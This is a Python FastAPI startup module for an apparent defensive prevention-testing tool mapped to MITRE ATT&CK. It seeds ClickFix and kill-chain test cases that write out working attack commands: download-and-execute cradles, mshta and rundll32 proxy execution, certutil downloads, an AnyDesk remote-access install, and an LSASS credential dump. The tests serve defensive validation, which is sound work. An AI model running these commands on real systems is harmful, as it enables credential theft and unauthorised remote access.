import logging
from contextlib import asynccontextmanager
from pathlib import Path

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles

from backend.app.core.config import settings
from backend.app.db.database import async_session, init_db
from backend.app.api.routes import techniques, playbooks, adversaries, results, sources, integrations, qa

logger = logging.getLogger(__name__)


async def _seed_mitre_data():
    """Seed MITRE ATT&CK techniques and adversary groups into the database on startup."""
    from backend.app.core.mitre import get_mitre_client
    from backend.app.models.technique import Technique
    from backend.app.models.adversary import AdversaryGroup

    mitre = await get_mitre_client()

    async with async_session() as db:
        # Seed techniques and enrich any bare-bones entries
        seeded_techs = 0
        enriched_techs = 0
        for tech_data in mitre.get_all_techniques():
            existing = await db.get(Technique, tech_data["id"])
            if not existing:
                db.add(Technique(
                    id=tech_data["id"],
                    name=tech_data["name"],
                    description=tech_data.get("description", ""),
                    tactics=tech_data.get("tactics", []),
                    platforms=tech_data.get("platforms", []),
                    sources=[],
                    url=tech_data.get("url", ""),
                ))
                seeded_techs += 1
            elif existing.name == existing.id:
                # Enrich bare-bones technique that was created by source sync
                # before the full MITRE dataset was available
                existing.name = tech_data.get("name", existing.name)
                existing.description = tech_data.get("description", "") or existing.description
                existing.tactics = tech_data.get("tactics", []) or existing.tactics
                existing.platforms = tech_data.get("platforms", []) or existing.platforms
                existing.url = tech_data.get("url", "") or existing.url
                enriched_techs += 1
            else:
                # Re-sync tactics from MITRE source so v18→v19 tactic renames
                # (e.g., defense-evasion → stealth) propagate to existing rows.
                new_tactics = tech_data.get("tactics", [])
                if new_tactics and existing.tactics != new_tactics:
                    existing.tactics = new_tactics
                    enriched_techs += 1

        # Seed adversary groups and update those with empty technique mappings
        seeded_groups = 0
        enriched_groups = 0
        for group_data in mitre.get_all_groups():
            tech_ids = mitre.get_group_techniques(group_data["id"])
            existing = await db.get(AdversaryGroup, group_data["id"])
            if not existing:
                db.add(AdversaryGroup(
                    id=group_data["id"],
                    name=group_data["name"],
                    description=group_data.get("description", ""),
                    aliases=group_data.get("aliases", []),
                    technique_ids=tech_ids,
                    url=group_data.get("url", ""),
                ))
                seeded_groups += 1
            elif not existing.technique_ids and tech_ids:
                # Group exists but had no technique mappings — update it
                existing.technique_ids = tech_ids
                enriched_groups += 1

        await db.commit()
        if seeded_techs or seeded_groups or enriched_techs or enriched_groups:
            logger.info(
                f"MITRE ATT&CK: seeded {seeded_techs} techniques, "
                f"enriched {enriched_techs} bare entries, "
                f"seeded {seeded_groups} groups, "
                f"enriched {enriched_groups} groups with technique mappings"
            )


async def _seed_custom_tests():
    """Seed custom prevention tests (ClickFix, combo kill chains) on startup."""
    from backend.app.models.technique import Technique
    from backend.app.models.test_case import PreventionTest

    custom_tests = [
        # === ClickFix Social Engineering Tests ===
        {
            "id": "clickfix-001",
            "technique_id": "T1204.004",
            "source": "custom",
            "name": "ClickFix: PowerShell IWR/IEX Download Cradle",
            "description": "Simulates the ClickFix attack where a victim pastes a PowerShell download cradle from a fake CAPTCHA into the Run dialog. IWR piped to IEX is the most common ClickFix payload pattern.",
            "command": 'powershell.exe -w hidden -c "IEX (Invoke-WebRequest -UseBasicParsing -Uri \'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\').Content; Write-Host ClickFix-IWR-IEX-test-SUCCESS"',
            "executor": "powershell",
            "cleanup_command": 'Remove-Item -Path "$env:TEMP\\clickfix_test*" -Force -ErrorAction SilentlyContinue',
            "elevation_required": False,
            "risk_level": "high",
            "platforms": ["windows"],
            "metadata": {"attack_techniques": ["T1204.004", "T1059.001", "T1105"], "category": "clickfix"},
        },
        {
            "id": "clickfix-002",
            "technique_id": "T1218.005",
            "source": "custom",
            "name": "ClickFix: mshta Remote HTA Execution",
            "description": "Simulates ClickFix variant using mshta.exe (a signed Windows LOLBIN) to execute JavaScript that spawns PowerShell. Tests application control against proxy execution.",
            "command": "mshta.exe \"javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell.exe -nop -w hidden -c Write-Host ClickFix-mshta-test-SUCCESS');close()\"",
            "executor": "cmd",
            "cleanup_command": None,
            "elevation_required": False,
            "risk_level": "high",
            "platforms": ["windows"],
            "metadata": {"attack_techniques": ["T1204.004", "T1218.005"], "category": "clickfix"},
        },
        {
            "id": "clickfix-003",
            "technique_id": "T1059.001",
            "source": "custom",
            "name": "ClickFix: Encoded PowerShell Command (-enc)",
            "description": "Simulates ClickFix variant using Base64-encoded PowerShell (-enc flag) to obfuscate the payload. EDR and AMSI should detect encoded command execution.",
            "command": "powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAQwBsAGkAYwBrAEYAaQB4ACAAZQBuAGMAbwBkAGUAZAAgAHQAZQBzAHQAIABTAFUAQwBDAEUAUwBTACIA",
            "executor": "cmd",
            "cleanup_command": None,
            "elevation_required": False,
            "risk_level": "high",
            "platforms": ["windows"],
            "metadata": {"attack_techniques": ["T1204.004", "T1059.001", "T1027"], "category": "clickfix"},
        },
        {
            "id": "clickfix-004",
            "technique_id": "T1204.004",
            "source": "custom",
            "name": "ClickFix: Clipboard Paste-and-Execute Simulation",
            "description": "Simulates the ClickFix clipboard attack chain: malicious content placed on clipboard, then executed via Get-Clipboard piped to Invoke-Expression. Mimics the Win+R, Ctrl+V, Enter flow.",
            "command": "powershell.exe -nop -c \"Set-Clipboard -Value 'whoami /all'; $cmd = Get-Clipboard; Invoke-Expression $cmd\"",
            "executor": "powershell",
            "cleanup_command": "Set-Clipboard -Value ''",
            "elevation_required": False,
            "risk_level": "medium",
            "platforms": ["windows"],
            "metadata": {"attack_techniques": ["T1204.004", "T1059.001"], "category": "clickfix"},
        },
        {
            "id": "clickfix-005",
            "technique_id": "T1105",
            "source": "custom",
            "name": "ClickFix: certutil Download-and-Decode",
            "description": "Simulates ClickFix variant using certutil.exe (Windows LOLBIN) to download content from a remote URL, bypassing browser download protections. certutil is one of the most commonly abused LOL binaries.",
            "command": 'cmd.exe /c "certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %TEMP%\\clickfix_test.txt && type %TEMP%\\clickfix_test.txt && echo ClickFix-certutil-test-SUCCESS"',
            "executor": "cmd",
            "cleanup_command": "del /f /q %TEMP%\\clickfix_test.txt 2>nul",
            "elevation_required": False,
            "risk_level": "high",
            "platforms": ["windows"],
            "metadata": {"attack_techniques": ["T1204.004", "T1105", "T1140"], "category": "clickfix"},
        },
        # === Kill Chain Combo Tests ===
        {
            "id": "killchain-001",
            "technique_id": "T1059.001",
            "source": "custom",
            "name": "Kill Chain: Stage 1 - Initial Access via PowerShell Download",
            "description": "Stage 1 of the LOLBAS+LOLDrivers+LOLRMM combo kill chain. Simulates initial access via a PowerShell download cradle that fetches and executes a second-stage payload — the entry point for ClickFix, phishing, and social engineering attacks.",
            "command": 'powershell.exe -NoProfile -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $stage2 = (Invoke-WebRequest -UseBasicParsing -Uri \'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\').Content; Write-Host \'Stage 1 SUCCESS - Downloaded\' $stage2.Length \'bytes\'"',
            "executor": "powershell",
            "cleanup_command": None,
            "elevation_required": False,
            "risk_level": "high",
            "platforms": ["windows"],
            "metadata": {"category": "killchain", "stage": 1, "killchain": "clickfix-to-crown-jewels"},
        },
        {
            "id": "killchain-002",
            "technique_id": "T1218.011",
            "source": "custom",
            "name": "Kill Chain: Stage 2 - LOL Binary Abuse (rundll32 proxy exec)",
            "description": "Stage 2 of the combo kill chain. Uses rundll32.exe to proxy-execute a DLL payload. Application control should block this unsigned DLL execution pattern.",
            "command": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -nop -c Write-Host Kill-Chain-Stage2-rundll32-SUCCESS")',
            "executor": "cmd",
            "cleanup_command": None,
            "elevation_required": False,
            "risk_level": "high",
            "platforms": ["windows"],
            "metadata": {"category": "killchain", "stage": 2, "killchain": "clickfix-to-crown-jewels"},
        },
        {
            "id": "killchain-003",
            "technique_id": "T1219",
            "source": "custom",
            "name": "Kill Chain: Stage 3 - RMM Tool Deployment (AnyDesk for persistence)",
            "description": "Stage 3 of the combo kill chain. Attempts to download and execute AnyDesk for persistent remote access. Application control and network filtering should prevent unauthorized RMM deployment.",
            "command": 'powershell.exe -NoProfile -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $outPath = Join-Path $env:TEMP \'AnyDesk.exe\'; Write-Host \'Downloading AnyDesk...\'; Invoke-WebRequest -Uri \'https://download.anydesk.com/AnyDesk.exe\' -OutFile $outPath -UseBasicParsing; if (Test-Path $outPath) { Write-Host \'Downloaded to:\' $outPath; $proc = Start-Process -FilePath $outPath -ArgumentList \'--help\' -PassThru -NoNewWindow -ErrorAction Stop; Start-Sleep -Seconds 3; if (-not $proc.HasExited) { $proc.Kill() }; Write-Host \'ALLOWED: AnyDesk executed\' } else { Write-Host \'Download blocked\' }"',
            "executor": "powershell",
            "cleanup_command": 'del /f "%TEMP%\\AnyDesk.exe" 2>nul',
            "elevation_required": False,
            "risk_level": "high",
            "platforms": ["windows"],
            "metadata": {"category": "killchain", "stage": 3, "killchain": "clickfix-to-crown-jewels"},
        },
        {
            "id": "killchain-004",
            "technique_id": "T1082",
            "source": "custom",
            "name": "Kill Chain: Stage 4 - Discovery (system enumeration)",
            "description": "Stage 4 of the combo kill chain. Runs standard adversary discovery commands to enumerate the system, network, and security tools. These are the first commands run after establishing access.",
            "command": "cmd.exe /c \"systeminfo && whoami /all && ipconfig /all && net view /domain 2>nul && nltest /domain_trusts 2>nul && tasklist /v && wmic product get name,version 2>nul\"",
            "executor": "cmd",
            "cleanup_command": None,
            "elevation_required": False,
            "risk_level": "medium",
            "platforms": ["windows"],
            "metadata": {"category": "killchain", "stage": 4, "killchain": "clickfix-to-crown-jewels"},
        },
        {
            "id": "killchain-005",
            "technique_id": "T1003.001",
            "source": "custom",
            "name": "Kill Chain: Stage 5 - Credential Dumping (comsvcs MiniDump LSASS)",
            "description": "Stage 5 of the combo kill chain. Attempts to dump LSASS process memory using comsvcs.dll MiniDump — a common LOL technique for credential theft. LSASS protection (PPL, Credential Guard) should block this.",
            "command": "powershell.exe -NoProfile -c \"$lsass = Get-Process lsass; $dumpPath = Join-Path $env:TEMP 'lsass_test.dmp'; rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass.Id $dumpPath full; if (Test-Path $dumpPath) { Write-Host 'ALLOWED: LSASS dump created at' $dumpPath } else { Write-Host 'BLOCKED: LSASS dump prevented' }\"",
            "executor": "powershell",
            "cleanup_command": "del /f \"%TEMP%\\lsass_test.dmp\" 2>nul",
            "elevation_required": True,
            "risk_level": "high",
            "platforms": ["windows"],
            "metadata": {"category": "killchain", "stage": 5, "killchain": "clickfix-to-crown-jewels"},
        },
    ]

    async with async_session() as db:
        seeded = 0
        for test_dict in custom_tests:
            existing = await db.get(PreventionTest, test_dict["id"])
            if existing:
                # Update if it exists (allows iterating on custom tests)
                existing.command = test_dict["command"]
                existing.description = test_dict["description"]
                existing.name = test_dict["name"]
                existing.cleanup_command = test_dict.get("cleanup_command")
                existing.metadata_ = test_dict.get("metadata", {})
            else:
                # Ensure the technique exists
                tech = await db.get(Technique, test_dict["technique_id"])
                if not tech:
                    db.add(Technique(
                        id=test_dict["technique_id"],
                        name=test_dict["technique_id"],
                        description="",
                        tactics=[],
                        platforms=test_dict.get("platforms", []),
                        sources=["custom"],
                        url="",
                    ))

                db.add(PreventionTest(
                    id=test_dict["id"],
                    technique_id=test_dict["technique_id"],
                    source=test_dict["source"],
                    name=test_dict["name"],
                    description=test_dict["description"],
                    command=test_dict["command"],
                    executor=test_dict["executor"],
                    cleanup_command=test_dict.get("cleanup_command"),
                    elevation_required=test_dict.get("elevation_required", False),
                    binary_path=test_dict.get("binary_path"),
                    risk_level=test_dict.get("risk_level", "medium"),
                    platforms=test_dict.get("platforms", []),
                    metadata_=test_dict.get("metadata", {}),
                ))
                seeded += 1

        await db.commit()
        if seeded:
            logger.info(f"Seeded {seeded} custom prevention tests (ClickFix, kill chain)")


def _invalidate_stale_mitre_cache() -> None:
    """Delete the MITRE cache if it was generated from the limited fallback dataset.

    The fallback dataset only has ~50 techniques.  The full STIX download should
    contain 600+ techniques.  If the cache is suspiciously small, delete it so
    the next ``get_mitre_client()`` call re-fetches from GitHub.
    """
    import json as _json

    cache_file = settings.mitre_cache_dir / "attack_data.json"
    if not cache_file.exists():
        return
    try:
        data = _json.loads(cache_file.read_text())
        tech_count = len(data.get("techniques", {}))
        if tech_count < 200:
            cache_file.unlink()
            logger.info(
                f"Deleted stale MITRE cache ({tech_count} techniques). "
                "Will re-fetch full ATT&CK dataset."
            )
    except Exception:
        pass


@asynccontextmanager
async def lifespan(app: FastAPI):
    settings.data_dir.mkdir(parents=True, exist_ok=True)
    settings.mitre_cache_dir.mkdir(parents=True, exist_ok=True)
    await init_db()
    _invalidate_stale_mitre_cache()
    await _seed_mitre_data()
    await _seed_custom_tests()
    yield


app = FastAPI(
    title=settings.app_name,
    version=settings.app_version,
    description="Prevention-focused LOL testing framework mapped to MITRE ATT&CK",
    lifespan=lifespan,
    docs_url="/api/docs",
    redoc_url="/api/redoc",
    openapi_url="/api/openapi.json",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Content-Type", "Authorization"],
)

app.include_router(techniques.router, prefix="/api/techniques", tags=["techniques"])
app.include_router(playbooks.router, prefix="/api/playbooks", tags=["playbooks"])
app.include_router(adversaries.router, prefix="/api/adversaries", tags=["adversaries"])
app.include_router(results.router, prefix="/api/results", tags=["results"])
app.include_router(sources.router, prefix="/api/sources", tags=["sources"])
app.include_router(integrations.router, prefix="/api/integrations", tags=["integrations"])
app.include_router(qa.router, prefix="/api/qa", tags=["qa"])


@app.get("/api/health")
async def health():
    return {"status": "ok", "version": settings.app_version}


@app.get("/api/agent/download")
async def download_agent():
    """Download the full AtomicPrevention agent bundle (PowerShell + Python) as a zip file."""
    import io
    import zipfile
    from pathlib import Path
    from fastapi.responses import StreamingResponse

    agent_dir = Path(__file__).resolve().parent.parent.parent / "agent"
    if not agent_dir.exists():
        from fastapi.responses import JSONResponse
        return JSONResponse(status_code=404, content={"error": "Agent directory not found"})

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for p in sorted(agent_dir.rglob("*")):
            if p.is_file() and not p.name.startswith("."):
                arcname = f"AtomicPrevention/{p.relative_to(agent_dir)}"
                zf.write(p, arcname)

    buf.seek(0)
    return StreamingResponse(
        buf,
        media_type="application/zip",
        headers={"Content-Disposition": "attachment; filename=AtomicPrevention-Agent.zip"},
    )


@app.get("/api/agent/download-python")
async def download_python_agent():
    """Download the cross-platform Python agent as a single file.

    This is the lightweight option for macOS and Linux users who only need
    the Python runner -- no zip extraction required.  Usage::

        curl -fL http://server:3000/api/agent/download-python -o atomic_prevention_runner.py
        python3 atomic_prevention_runner.py --playbook ./my-playbook.json
    """
    from pathlib import Path
    from fastapi.responses import FileResponse, JSONResponse

    agent_script = Path(__file__).resolve().parent.parent.parent / "agent" / "atomic_prevention_runner.py"
    if not agent_script.exists():
        return JSONResponse(status_code=404, content={"error": "Python agent not found"})

    return FileResponse(
        path=str(agent_script),
        media_type="text/x-python",
        filename="atomic_prevention_runner.py",
    )


# The production image contains a statically exported Next.js frontend.
# Mount it last so the explicit /api routes above always take precedence.
frontend_dir = Path(__file__).resolve().parents[2] / "frontend-static"
if frontend_dir.is_dir():
    app.mount("/", StaticFiles(directory=frontend_dir, html=True), name="frontend")
